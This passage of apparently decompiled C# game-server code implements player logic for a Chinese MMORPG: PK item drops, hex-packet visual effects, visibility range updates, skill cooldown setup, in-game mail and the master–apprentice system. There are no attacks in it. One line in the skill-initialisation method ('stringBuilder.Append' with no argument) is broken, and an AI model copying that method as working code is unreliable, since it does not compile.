						World.发送公告("玩家[" + base.UserName + "]被[" + TOPlaye.UserName + "]击杀，掉落物品[" + value.ItmeNAME + "]");
						地面物品类2 = new 地面物品类(array, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图, TOPlaye, 0);
						if (地面物品类2 == null)
						{
							MainForm.WriteLine(1, "PK掉出物品2 出错 " + base.人物全服ID + "|" + base.UserName);
							return null;
						}
						if (!World.ItemTemp.ContainsKey(get物品全局ID))
						{
							World.ItemTemp.Add(get物品全局ID, 地面物品类2);
						}
					}
					catch (Exception ex2)
					{
						MainForm.WriteLine(1, "PK掉出物品3 出错 " + base.人物全服ID + "|" + base.UserName + " " + ex2.Message);
						return null;
					}
					try
					{
						if (World.ItemTemp.ContainsKey(get物品全局ID))
						{
							地面物品类2.获取范围玩家发送地面增加物品数据包();
						}
						return array;
					}
					catch (Exception ex3)
					{
						MainForm.WriteLine(1, "PK掉出物品4 出错 " + base.人物全服ID + "|" + base.UserName + " " + ex3.Message);
						return null;
					}
				}
				return null;
			}
			catch (Exception ex4)
			{
				MainForm.WriteLine(1, "PK掉出物品5 出错 " + TOPlaye.人物全服ID + "|" + TOPlaye.UserName + " " + ex4.Message);
				return null;
			}
		}

		public void 灵兽转职业(int 正邪, int 转)
		{
			人物灵兽.FLD_JOB_LEVEL = 转;
			using 发包类 发包类 = new 发包类();
			发包类.Write(转);
			发包类.Write(正邪);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32256, base.人物灵兽全服ID);
			}
			发送当前范围广播数据(发包类, 32256, base.人物灵兽全服ID);
		}

		public void 人物转职业(int 人物正邪, int 转)
		{
			base.Player_Zx = 人物正邪;
			base.Player_Job_leve = 转;
			using 发包类 发包类 = new 发包类();
			发包类.Write(转);
			发包类.Write(人物正邪);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32256, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 32256, base.人物全服ID);
		}

		public void 烟花(int 道具ID, int 施放对象)
		{
			byte[] array = Converter.hexStringToByte("AA5512000A007F000400CD99053C000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(道具ID), 0, array, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(施放对象), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 膜拜特效(int 道具ID, int 施放对象)
		{
			byte[] array = Converter.hexStringToByte("AA5512000A007F000400CD99053C000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(道具ID), 0, array, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(施放对象), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 人物发光()
		{
			byte[] array = Converter.hexStringToByte("AA55120014047F000400A0CB0000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 吃药效果(int 物品id)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write8(物品id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32512, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 32512, base.人物全服ID);
		}

		public void 吃药效果灵兽(int 物品id)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(物品id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32512, 人物灵兽.全服ID);
			}
			发送当前范围广播数据(发包类, 32512, 人物灵兽.全服ID);
		}

		public void 离开当前地图()
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_离开当前地图");
			}
			try
			{
				try
				{
					if (PlayList != null)
					{
						foreach (Players value in PlayList.Values)
						{
							离开当前地图(value, this);
							if (value.PlayList != null)
							{
								value.PlayList.Remove(base.人物全服ID);
							}
						}
					}
				}
				catch (Exception ex)
				{
					MainForm.WriteLine(1, "离开当前地图()人物离开出错出错[" + base.Userid + "]-[" + base.UserName + "]" + ex);
				}
				try
				{
					if (NpcList != null)
					{
						foreach (NpcClass value2 in NpcList.Values)
						{
							try
							{
								value2.PlayList_Remove(this);
							}
							catch
							{
							}
						}
					}
				}
				catch (Exception ex2)
				{
					MainForm.WriteLine(1, "离开当前地图()NPC离开出错[" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
				}
				try
				{
					if (地面物品列表 == null)
					{
						return;
					}
					foreach (地面物品类 value3 in 地面物品列表.Values)
					{
						try
						{
							value3.PlayList.Remove(base.人物全服ID);
						}
						catch
						{
						}
					}
				}
				catch (Exception ex3)
				{
					MainForm.WriteLine(1, "离开当前地图()地面物品列表 离开出错[" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
				}
			}
			catch (Exception ex4)
			{
				MainForm.WriteLine(1, "离开当前地图()出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex4.Message);
			}
			finally
			{
				if (PlayList != null)
				{
					PlayList.Clear();
				}
				if (NpcList != null)
				{
					NpcList.Clear();
				}
				if (地面物品列表 != null)
				{
					地面物品列表.Clear();
				}
			}
		}

		public void 移动离开当前地图(int tomap)
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_移动离开当前地图");
			}
			try
			{
				if (PlayList == null)
				{
					return;
				}
				foreach (Players value in PlayList.Values)
				{
					离开当前地图(this, value);
					离开当前地图(value, this);
					value.PlayList.Remove(base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "移动离开当前地图()出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
			finally
			{
				if (PlayList != null)
				{
					PlayList.Clear();
				}
			}
		}

		public void 发送呐喊消息广播数据(byte[] data, int length)
		{
			try
			{
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.UserName != base.UserName && 查找范围玩家(300, value) && value.Client != null && value.Client.Running && !value.Client.挂机)
					{
						value.Client.Send(data, length);
					}
				}
			}
			catch
			{
			}
		}

		public void 发送狮子吼消息广播数据(byte[] data, int length)
		{
			try
			{
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.Client != null && value.Client.Running && !value.Client.挂机)
					{
						value.Client.Send(data, length);
					}
				}
			}
			catch
			{
			}
		}

		public int 查询已登陆帐号数量(string wip)
		{
			try
			{
				int num = 0;
				if (World.信任连接IP != "")
				{
					string[] array = World.信任连接IP.Split(';');
					for (int i = 0; i < array.Length; i++)
					{
						if (array[i] == base.Client.ToString())
						{
							return 0;
						}
					}
				}
				foreach (客户端IP地址 value in World.IpList.Values)
				{
					if (value.外网IP地址 == wip)
					{
						num++;
					}
				}
				return num;
			}
			catch
			{
				return 0;
			}
		}

		public bool 查找范围玩家(int far_, Players Playe)
		{
			if (Playe.人物坐标_地图 != base.人物坐标_地图)
			{
				return false;
			}
			float num = Playe.人物坐标_X - base.人物坐标_X;
			float num2 = Playe.人物坐标_Y - base.人物坐标_Y;
			return (int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= far_;
		}

		public bool 查找范围玩家2(int far_, Players Playe)
		{
			if (Playe.人物坐标_地图 != base.人物坐标_地图)
			{
				return false;
			}
			if (Playe.人物全服ID == base.人物全服ID)
			{
				return false;
			}
			float num = Playe.人物坐标_X - base.人物坐标_X;
			float num2 = Playe.人物坐标_Y - base.人物坐标_Y;
			return (int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= far_;
		}

		public List<Players> 群攻查找范围RW2(int 数量)
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "NpcClass_群攻查找范围Npc2");
			}
			try
			{
				List<Players> list = new List<Players>();
				int num = 0;
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (查找范围玩家2(100, value) && value.人物全服ID != base.人物全服ID)
					{
						list.Add(value);
						if (num >= 数量)
						{
							break;
						}
						num++;
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "群攻查找范围玩家 出错：" + ex);
				return null;
			}
		}

		public void 守城城主是否在守城雕像附近()
		{
			try
			{
				if (base.人物坐标_地图 != 42001)
				{
					return;
				}
				bool flag = false;
				if (base.帮派人物等级 == 6 && base.帮派名字 == World.天魔神宫占领者)
				{
					if (World.SiegeWar.守城雕像.查找范围玩家(100, this))
					{
						if (!World.SiegeWar.火龙之力释放)
						{
							flag = true;
							World.SiegeWar.守城雕像.发送怪物头上图标(1);
						}
						World.SiegeWar.火龙之力释放 = true;
					}
					else
					{
						if (World.SiegeWar.火龙之力释放)
						{
							flag = true;
							World.SiegeWar.守城雕像.发送怪物头上图标(0);
						}
						World.SiegeWar.火龙之力释放 = false;
					}
					if (!flag)
					{
						return;
					}
					string hex = "AA551A00150183031400040000000100000000000000000000000000000055AA";
					byte[] array = Converter.hexStringToByte(hex);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (World.SiegeWar.火龙之力释放)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 14, 1);
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 14, 1);
					}
					foreach (Players value in World.AllConnectedPlayers.Values)
					{
						if (value.人物坐标_地图 == 42001 && value.Client != null)
						{
							value.Client.Send(array, array.Length);
						}
					}
					return;
				}
				if (World.SiegeWar.火龙之力释放)
				{
					string hex2 = "AA551200E9478B100C0046050000E94700000100000055AA";
					byte[] array2 = Converter.hexStringToByte(hex2);
					Buffer.BlockCopy(BitConverter.GetBytes(World.SiegeWar.守城雕像.FLD_INDEX), 0, array2, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 18, 4);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		public void 发送移动数据包(float X, float Y, float Z, int map)
		{
			移动离开当前地图(map);
			base.人物坐标_X = X;
			base.人物坐标_Y = Y;
			base.人物坐标_Z = Z;
			base.人物坐标_地图 = map;
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write4(0);
				发包类.Write(base.人物坐标_X);
				发包类.Write(base.人物坐标_Z);
				发包类.Write(base.人物坐标_Y);
				发包类.Write4(base.人物坐标_地图);
				发包类.Write4(0);
				发包类.Write4(1);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 30976, base.人物全服ID);
				}
			}
			获取复查范围玩家();
			获取复查范围Npc();
			获取复查范围地面物品();
		}

		public Players 取联盟盟主()
		{
			foreach (Players value in World.AllConnectedPlayers.Values)
			{
				if (value.门派联盟盟主 == base.门派联盟盟主 && value.门派联盟盟主 == value.帮派名字 && value.帮派人物等级 == 6)
				{
					return value;
				}
			}
			return null;
		}

		public bool 玩家是否在指定范围内(int far_, Players Playe)
		{
			if (Playe.人物坐标_地图 != base.人物坐标_地图)
			{
				return false;
			}
			float num = Playe.人物坐标_X - base.人物坐标_X;
			float num2 = Playe.人物坐标_Y - base.人物坐标_Y;
			return (int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= far_;
		}

		public void 获取复查范围玩家()
		{
			try
			{
				if (PlayList == null)
				{
					return;
				}
				Queue queue = Queue.Synchronized(new Queue());
				foreach (Players value2 in World.AllConnectedPlayers.Values)
				{
					queue.Enqueue(value2);
				}
				while (queue.Count > 0)
				{
					Players players = (Players)queue.Dequeue();
					if (players.Client == null || !players.Client.Running || players.人物全服ID == base.人物全服ID)
					{
						continue;
					}
					Players value;
					if (查找范围玩家(400, players))
					{
						if (!PlayList.TryGetValue(players.人物全服ID, out value))
						{
							PlayList.Add(players.人物全服ID, players);
							更新人物数据(players);
						}
						if (!players.PlayList.TryGetValue(base.人物全服ID, out value))
						{
							players.PlayList.Add(base.人物全服ID, this);
							players.更新人物数据(this);
						}
					}
					else if (PlayList.TryGetValue(players.人物全服ID, out value))
					{
						PlayList.Remove(players.人物全服ID);
						离开当前地图(this, players);
						players.PlayList.Remove(base.人物全服ID);
						离开当前地图(players, this);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "获取复查范围玩家()出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex);
			}
		}

		public bool 查找范围Npc(int far_, NpcClass Npc)
		{
			if (Npc.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			if (base.人物坐标_地图 == 7101)
			{
				far_ = 1000;
			}
			float num = Npc.X - base.人物坐标_X;
			float num2 = Npc.Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public bool 查找范围Npc(int NPCID, int far_)
		{
			NpcClass npcClass = null;
			foreach (NpcClass value in NpcList.Values)
			{
				if (value.FLD_PID == NPCID)
				{
					npcClass = value;
					break;
				}
			}
			if (npcClass == null || npcClass.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = npcClass.X - base.人物坐标_X;
			float num2 = npcClass.Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public void 获取复查范围Npc()
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_获取复查范围Npc");
			}
			try
			{
				if (NpcList == null || base.Client.挂机)
				{
					return;
				}
				ConcurrentDictionary<int, NpcClass> concurrentDictionary = new ConcurrentDictionary<int, NpcClass>();
				ConcurrentDictionary<int, NpcClass> concurrentDictionary2 = new ConcurrentDictionary<int, NpcClass>();
				foreach (NpcClass value in NpcList.Values)
				{
					if (!查找范围Npc(400, value))
					{
						NpcList.Remove(value.FLD_INDEX);
						if (!concurrentDictionary2.ContainsKey(value.FLD_INDEX))
						{
							concurrentDictionary2.TryAdd(value.FLD_INDEX, value);
						}
						if (value.Contains(this))
						{
							value.PlayList_Remove(this);
						}
					}
				}
				foreach (NpcClass value2 in MapClass.GetnpcTemplate(base.人物坐标_地图).Values)
				{
					if (查找范围Npc(400, value2))
					{
						if (value2.NPC死亡)
						{
							if (!concurrentDictionary2.ContainsKey(value2.FLD_INDEX))
							{
								concurrentDictionary2.TryAdd(value2.FLD_INDEX, value2);
							}
						}
						else if (!NpcList.ContainsKey(value2.FLD_INDEX))
						{
							NpcList.Add(value2.FLD_INDEX, value2);
							value2.PlayList_Add(this);
							if (!concurrentDictionary.ContainsKey(value2.FLD_INDEX))
							{
								concurrentDictionary.TryAdd(value2.FLD_INDEX, value2);
							}
						}
					}
					else if (NpcList.ContainsKey(value2.FLD_INDEX))
					{
						NpcList.Remove(value2.FLD_INDEX);
						value2.PlayList_Remove(this);
						if (!concurrentDictionary2.ContainsKey(value2.FLD_INDEX))
						{
							concurrentDictionary2.TryAdd(value2.FLD_INDEX, value2);
						}
					}
				}
				NpcClass.更新NPC删除数据(concurrentDictionary2, this);
				NpcClass.更新NPC数据(concurrentDictionary, this);
			}
			catch (Exception)
			{
				MainForm.WriteLine(1, "获取复查范围NPC()出错!用户[" + base.Userid + "]-[" + base.UserName + "]");
			}
		}

		public bool 查找范围地面物品(int far_, 地面物品类 地面物品)
		{
			if (地面物品.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = 地面物品.Rxjh_X - base.人物坐标_X;
			float num2 = 地面物品.Rxjh_Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public NpcClass NpcListContains(int index)
		{
			if (NpcList == null || NpcList.Count == 0)
			{
				return null;
			}
			NpcClass value;
			return (!NpcList.TryGetValue(index, out value)) ? null : value;
		}

		public void 获取复查范围地面物品()
		{
			if (地面物品列表 == null)
			{
				return;
			}
			try
			{
				Queue queue = Queue.Synchronized(new Queue());
				ConcurrentDictionary<long, 地面物品类> concurrentDictionary = new ConcurrentDictionary<long, 地面物品类>();
				foreach (地面物品类 value in 地面物品列表.Values)
				{
					if (!World.ItemTemp.ContainsKey(value.id))
					{
						queue.Enqueue(value.id);
						if (地面物品列表.ContainsKey(value.id))
						{
							地面物品列表.Remove(value.id);
						}
					}
				}
				foreach (地面物品类 value2 in World.ItemTemp.Values)
				{
					if (查找范围地面物品(400, value2))
					{
						if (地面物品列表.ContainsKey(value2.id))
						{
							continue;
						}
						地面物品列表.Add(value2.id, value2);
						if (value2.PlayList != null)
						{
							if (!value2.PlayList.ContainsKey(base.人物全服ID))
							{
								value2.PlayList.Add(base.人物全服ID, this);
							}
							if (!concurrentDictionary.ContainsKey(value2.id))
							{
								concurrentDictionary.TryAdd(value2.id, value2);
							}
						}
					}
					else if (地面物品列表.ContainsKey(value2.id))
					{
						queue.Enqueue(value2.id);
						地面物品列表.Remove(value2.id);
					}
				}
				while (queue.Count > 0)
				{
					地面物品消失((long)queue.Dequeue());
				}
				地面物品增加(concurrentDictionary);
			}
			catch (Exception)
			{
			}
		}

		public void 初始化职业技能()
		{
			int num = 0;
			try
			{
				List<武功类> list = new List<武功类>();
				foreach (武功类 value in World.TBL_KONGFU.Values)
				{
					if (value.FLD_PID != 710100 && value.FLD_PID != 710101 && value.FLD_PID != 710102 && value.FLD_PID != 710103 && value.FLD_JOB == base.Player_Job)
					{
						list.Add(value);
					}
				}
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Append
				byte[] array = Converter.hexStringToByte(stringBuilder.ToString());
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				for (int i = 0; i < list.Count; i++)
				{
					if (list[i].FLD_INDEX > 31 || list[i].FLD_INDEX == -1)
					{
						continue;
					}
					int num2 = i % 200;
					int num3 = list[i].FLD_CDTIME;
					Buffer.BlockCopy(BitConverter.GetBytes(list[i].FLD_PID), 0, array, 16 + num2 * 56, 4);
					if (base.Player_Job == 8 && num3 > 1000 && base.韩_升天二气功_内息行心 != 0.0)
					{
						num3 = (int)((double)num3 * (1.0 - base.韩_升天二气功_内息行心));
						if (num3 < 1000)
						{
							num3 = 1000;
						}
					}
					Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 16 + num2 * 56 + 32, 4);
					int fLD_武功类型 = list[i].FLD_武功类型;
					num = list[i].FLD_PID;
					if ((fLD_武功类型 == 0 || fLD_武功类型 == 3) && 武功新[list[i].FLD_武功类型, list[i].FLD_INDEX] != null)
					{
						武功新[list[i].FLD_武功类型, list[i].FLD_INDEX].FLD_CDTIME = num3;
					}
				}
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "初始化职业技能()出错" + base.人物全服ID + "| 技能ID" + num + ex.Message);
			}
		}

		public void 查看传书(byte[] data, int length)
		{
			try
			{
				if (data[10] == 0)
				{
					查看传书();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "查看传书出错()出错" + base.人物全服ID + "| " + ex.Message);
			}
		}

		public void 发送传书(byte[] data, int length)
		{
			try
			{
				if ((int)DateTime.Now.Subtract(传书时间).TotalMilliseconds >= 300000)
				{
					传书时间 = DateTime.Now;
					string empty = string.Empty;
					string empty2 = string.Empty;
					int num = data[33];
					if (num > 99)
					{
						num = 99;
					}
					byte[] array = new byte[num];
					string text;
					try
					{
						Buffer.BlockCopy(data, 35, array, 0, array.Length);
						text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
					}
					catch (Exception ex)
					{
						MainForm.WriteLine(1, "发送传书出错1![" + base.Userid + "]-[" + base.UserName + "]" + array.Length + " " + ex.Message);
						return;
					}
					byte[] array2 = new byte[15];
					Buffer.BlockCopy(data, 12, array2, 0, array2.Length);
					string 对方名字 = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
					if (text.Length > 0)
					{
						创建传书(this, 对方名字, 0, text, 2, 0);
					}
				}
			}
			catch (Exception ex2)
			{
				MainForm.WriteLine(1, "传书错误：" + ex2.Message);
			}
		}

		public void 创建传书(Players 发送人, string 对方名字, int IsNpc, string 消息内容, int 消息类型, int 数量)
		{
			try
			{
				if (base.Player_Money < 10000)
				{
					系统提示("资金不足。");
					return;
				}
				base.Player_Money -= 10000L;
				更新金钱和负重();
				if (RxjhClass.GetUserName(对方名字) != 1)
				{
					Players players = 得到人物数据(对方名字);
					if (players != null)
					{
						个人传书类 个人传书类2 = new 个人传书类
						{
							传书ID = (int)RxjhClass.GetDBItmeId(),
							传书发送人 = base.UserName,
							传书内容 = 消息内容,
							传书时间 = DateTime.Now,
							是否NPC = 0,
							是否已读 = 0
						};
						players.传书列表.TryAdd(个人传书类2.传书ID, 个人传书类2);
						players.有新传书提示(消息类型, 数量);
					}
					byte[] array = Converter.hexStringToByte("AA551000010000B4000100000000000000005DA355AA");
					base.Client.Send(array, array.Length);
					RxjhClass.创建传书(base.UserName, 对方名字, 0, 消息内容, 消息类型);
				}
				else
				{
					系统提示("无法找到对方。");
				}
			}
			catch
			{
			}
		}

		public static bool 是否有未读传书(Players player)
		{
			foreach (个人传书类 value in player.传书列表.Values)
			{
				if (value.是否已读 == 0)
				{
					return true;
				}
			}
			return false;
		}

		public void 阅读传书(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 10);
			try
			{
				if (传书列表 == null)
				{
					return;
				}
				string hex = "000000000000000055AA";
				byte[] array = Converter.hexStringToByte("AA553F000000B600310000");
				byte[] array2 = Converter.hexStringToByte(hex);
				foreach (个人传书类 value in 传书列表.Values)
				{
					if (value.传书ID == num)
					{
						if (value.是否已读 == 0)
						{
							value.是否已读 = 1;
							RxjhClass.设置传书已读(num, 1);
							查看传书();
						}
						byte[] bytes = Encoding.Default.GetBytes(value.传书内容);
						byte[] array3 = new byte[array.Length + array2.Length + bytes.Length + 6];
						Buffer.BlockCopy(array, 0, array3, 0, array.Length);
						Buffer.BlockCopy(array2, 0, array3, array3.Length - array2.Length, array2.Length);
						Buffer.BlockCopy(BitConverter.GetBytes(array3.Length - 6), 0, array3, 2, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length + 7), 0, array3, 8, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array3, 11, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, array3, 15, 2);
						Buffer.BlockCopy(bytes, 0, array3, 17, bytes.Length);
						base.Client.Send(array3, array3.Length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "阅读传书()出错" + base.人物全服ID + "| " + ex.Message);
			}
		}

		public void 师徒提示(int id, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA552000B9004110120029000F0000000000000000000000000000000000000000001C8455AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(对方名字);
			Buffer.BlockCopy(bytes, 0, array, 14, bytes.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 师徒系统(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && 封包数据[12 + i] != 0; i++)
				{
					array[i] = 封包数据[12 + i];
				}
				string text = Encoding.Default.GetString(array).Replace("\0", "").Trim();
				int num = 封包数据[10];
				int num2 = 封包数据[11];
				switch (num)
				{
				case 1:
				{
					if (师傅数据.TID != -1)
					{
						师徒提示(21, text);
					}
					bool flag2 = false;
					for (int k = 0; k < 3; k++)
					{
						if (徒弟数据[k].TID == -1)
						{
							flag2 = true;
							break;
						}
					}
					if (!flag2)
					{
						师徒提示(21, text);
						break;
					}
					if (base.Player_Job_leve < 2)
					{
						师徒提示(11, text);
						break;
					}
					Players players2 = World.检查玩家name(text);
					if (players2 != null)
					{
						if (师傅数据.TID != -1)
						{
							师徒提示(22, text);
							break;
						}
						if (players2.Player_Job_leve < 1)
						{
							师徒提示(12, text);
							break;
						}
						if (base.Player_Level - players2.Player_Level < 20)
						{
							师徒提示(13, text);
							break;
						}
						if (players2.Player_Zx != 0 && base.Player_Zx != players2.Player_Zx)
						{
							师徒提示(14, text);
							break;
						}
						if (!查找范围玩家(40, players2))
						{
							师徒提示(15, text);
							break;
						}
						base.FLD_临时师徒 = text;
						players2.FLD_临时师徒 = base.UserName;
						师徒提示(257, text);
						players2.师徒提示(257, base.UserName);
					}
					else
					{
						师徒提示(41, text);
					}
					break;
				}
				case 2:
				{
					if (师傅数据.TID != -1)
					{
						师徒提示(22, text);
						break;
					}
					if (base.Player_Job_leve < 1)
					{
						师徒提示(12, text);
						break;
					}
					Players players = World.检查玩家name(text);
					if (players != null)
					{
						if (players.师傅数据.TID != -1)
						{
							师徒提示(21, text);
							break;
						}
						bool flag = false;
						for (int j = 0; j < 3; j++)
						{
							if (players.徒弟数据[j].TID == -1)
							{
								flag = true;
								break;
							}
						}
						if (!flag)
						{
							师徒提示(21, text);
							break;
						}
						if (players.Player_Job_leve < 2)
						{
							师徒提示(11, text);
							break;
						}
						if (players.Player_Level - base.Player_Level < 20)
						{
							师徒提示(13, text);
							break;
						}
						if (base.Player_Zx != 0 && base.Player_Zx != players.Player_Zx)
						{
							师徒提示(14, text);
							break;
						}
						if (!查找范围玩家(40, players))
						{
							师徒提示(15, text);
							break;
						}
						base.FLD_临时师徒 = text;
						players.FLD_临时师徒 = base.UserName;
						师徒提示(513, text);
						players.师徒提示(513, base.UserName);
					}
					else
					{
						师徒提示(41, text);
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "师徒系统 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex.Message);
			}
		}

		public void 师徒系统请求(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = 封包数据[10];
				int num2 = 封包数据[11];
				Players players = World.检查玩家name(base.FLD_临时师徒);
				if (players == null)
				{
					return;
				}
				switch (num)
				{
				case 1:
					switch (num2)
					{
					case 1:
					{
						int num4 = -1;
						for (int j = 0; j < 3; j++)
						{
							if (徒弟数据[j].TID == -1)
							{
								num4 = j;
								break;
							}
						}
						if (num4 != -1 && RxjhClass.创建师徒关系(base.FLD_临时师徒, players.FLD_临时师徒, players.Player_Level, num4) == 1)
						{
							players.师傅数据.STNAME = players.FLD_临时师徒;
							players.师傅数据.STLEVEL = 1;
							players.师傅数据.TID = num4;
							players.师傅数据.STYHD = 0;
							players.师傅数据.TLEVEL = players.Player_Level;
							players.师傅数据.STWG1 = 0;
							players.师傅数据.STWG2 = 0;
							players.师傅数据.STWG3 = 0;
							徒弟数据[num4].TID = num4;
							徒弟数据[num4].STNAME = base.FLD_临时师徒;
							徒弟数据[num4].STLEVEL = 1;
							徒弟数据[num4].STYHD = 0;
							徒弟数据[num4].TLEVEL = players.Player_Level;
							徒弟数据[num4].STWG1 = 0;
							徒弟数据[num4].STWG2 = 0;
							徒弟数据[num4].STWG3 = 0;
							师徒请求接受(257, string.Empty);
							players.师徒请求接受(769, players.FLD_临时师徒);
							players.系统提示("拜师成功, 您的师傅是" + players.FLD_临时师徒, 9, "恭喜");
							players.徒弟更新师徒系统();
							师傅更新师徒系统(num4);
							base.FLD_临时师徒 = "";
							players.FLD_临时师徒 = "";
						}
						break;
					}
					case 2:
						base.FLD_临时师徒 = "";
						players.FLD_临时师徒 = "";
						师徒请求接受(513, "");
						players.师徒请求接受(513, base.UserName);
						break;
					}
					break;
				case 2:
					switch (num2)
					{
					case 1:
					{
						int num3 = -1;
						for (int i = 0; i < 3; i++)
						{
							if (players.徒弟数据[i].TID == -1)
							{
								num3 = i;
								break;
							}
						}
						if (num3 != -1 && RxjhClass.创建师徒关系(players.FLD_临时师徒, base.FLD_临时师徒, base.Player_Level, num3) == 1)
						{
							师傅数据.STNAME = base.FLD_临时师徒;
							师傅数据.STLEVEL = 1;
							师傅数据.TID = num3;
							师傅数据.STYHD = 0;
							师傅数据.TLEVEL = base.Player_Level;
							师傅数据.STWG1 = 0;
							师傅数据.STWG2 = 0;
							师傅数据.STWG3 = 0;
							players.徒弟数据[num3].TID = num3;
							players.徒弟数据[num3].STNAME = players.FLD_临时师徒;
							players.徒弟数据[num3].STLEVEL = 1;
							players.徒弟数据[num3].STYHD = 0;
							players.徒弟数据[num3].TLEVEL = base.Player_Level;
							players.徒弟数据[num3].STWG1 = 0;
							players.徒弟数据[num3].STWG2 = 0;
							players.徒弟数据[num3].STWG3 = 0;
							系统提示("拜师成功, 您的师傅是 " + base.FLD_临时师徒 + "。CTRL+B 打开师徒界面。");
							players.师徒请求接受(258, players.FLD_临时师徒);
							徒弟更新师徒系统();
							players.师傅更新师徒系统(num3);
							base.FLD_临时师徒 = "";
							players.FLD_临时师徒 = "";
						}
						break;
					}
					case 2:
						base.FLD_临时师徒 = "";
						players.FLD_临时师徒 = "";
						师徒请求接受(514, "");
						players.师徒请求接受(514, base.UserName);
						break;
					}
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "师徒系统请求 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex.Message);
			}
		}

		public void 师徒系统取消(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = 封包数据[10];
				int num2 = 封包数据[11];
				Players players = 得到人物数据(base.FLD_临时师徒);
				if (players == null)
				{
					return;
				}
				switch (num)
				{
				case 1:
					if (num2 == 3)
					{
						取消师徒请求(769, base.FLD_临时师徒);
						players.取消师徒请求(769, base.FLD_临时师徒);
					}
					break;
				case 2:
					if (num2 == 3)
					{
						取消师徒请求(770, base.FLD_临时师徒);
						players.取消师徒请求(769, base.FLD_临时师徒);
					}
					break;
				}
			}
			catch (Exception ex)
			{
